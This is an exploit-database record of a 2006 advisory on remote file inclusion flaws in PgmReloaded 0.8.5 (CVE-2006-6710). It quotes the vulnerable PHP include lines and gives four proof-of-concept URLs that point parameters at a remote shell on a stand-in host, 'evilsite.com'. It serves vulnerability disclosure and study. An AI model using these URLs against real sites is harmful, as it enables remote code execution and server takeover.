{
  "id": "2971",
  "title": "PgmReloaded 0.8.5 - Multiple Remote File Inclusions",
  "cve": "CVE-2006-6710",
  "vuln_type": "rce",
  "code": "+-------------------------------------------------------------------------------------------\r\n+ PgmReloaded <= 0.8.5 Multiple Remote File Include Vulnerabilities\r\n+-------------------------------------------------------------------------------------------\r\n+ Vendor ............: http://matteolucarelli.net/\r\n+ Affected Software .: PgmReloaded <= 0.8.5\r\n+ Download ..........: http://www.matteolucarelli.net/pgmreloaded/pgmreloaded-0.8.5.tgz\r\n+ Description .......: \"PgmReloaded is a simple CMS for e-commerce and generic web catalogs\"\r\n+ Class .............: Remote File Inclusion\r\n+ Risk ..............: High (Remote File Execution)\r\n+ Found By ..........: nuffsaid <nuffsaid[at]newbslove.us>\r\n+-------------------------------------------------------------------------------------------\r\n+ Details:\r\n+ PgmReloaded has several scripts which do not initialize variables before using them to\r\n+ include files, assuming register_globals = on, we can initialize any one of the variables\r\n+ in a query string and include a remote file of our choice. The index.php file is vulnerable\r\n+ to remote file inclusion regardless of register_globals settings.\r\n+\r\n+ Vulnerable Code:\r\n+ index.php, line(s) 06:\r\n+ -> 06: if ($_GET[\"lang\"]!=\"\") include ($_GET[\"lang\"] . \".php\");\r\n+ common.inc.php, line(s) 08-17:\r\n+ -> 08: include ($CFG[\"libdir\"] . \"stdlib.inc.php\");\r\n+ -> 09: include ($CFG[\"libdir\"] . \"phplib/db_\" . $CFG[\"dbms\"] . \".inc.php\");\t// PHPLib...\r\n+ -> 10: include ($CFG[\"libdir\"] . \"pgm_\" . $CFG[\"dbms\"] . \".inc.php\");\t\t// PGM extension...\r\n+ -> 11: include ($CFG[\"libdir\"] . $CFG[\"dbms\"] . \"_common.inc.php\");\r\n+ -> 12: include ($CFG[\"libdir\"] . \"pgm_common.inc.php\");\r\n+ -> 13: include ($CFG[\"libdir\"] . \"pgm_session.inc.php\");\r\n+ -> 14: include ($CFG[\"libdir\"] . \"pgm_users.inc.php\");\r\n+ -> 15: include ($CFG[\"libdir\"] . \"pgm_cart.inc.php\");\r\n+ -> 16: include ($CFG[\"libdir\"] . \"phplib/template.inc.php\");\r\n+ -> 17: include ($CFG[\"localedir\"] . $CFG[\"base_lang\"] . \"/base_lang.inc.php\");\r\n+ form_header.php, line(s) 07-15:\r\n+ -> 07: include ($CFG[\"localelangdir\"] . \"global-error.inc.php\");\r\n+ -> 15: include ($CFG[\"localelangdir\"] . \"global-common.inc.php\");\r\n+\r\n+ Proof Of Concept:\r\n+ http://[target]/[path]/index.php?lang=http://evilsite.com/shell.php?\r\n+ http://[target]/[path]/common.inc.php?CFG[libdir]=http://evilsite.com/shell.php?\r\n+ http://[target]/[path]/common.inc.php?CFG[localedir]=http://evilsite.com/shell.php?\r\n+ http://[target]/[path]/form_header.php?errormsg=1&CFG[localelangdir]=http://evilsite.com/shell.php?\r\n+-------------------------------------------------------------------------------------------\r\n\r\n# milw0rm.com [2006-12-21]",
  "url": "https://www.exploit-db.com/exploits/2971"
}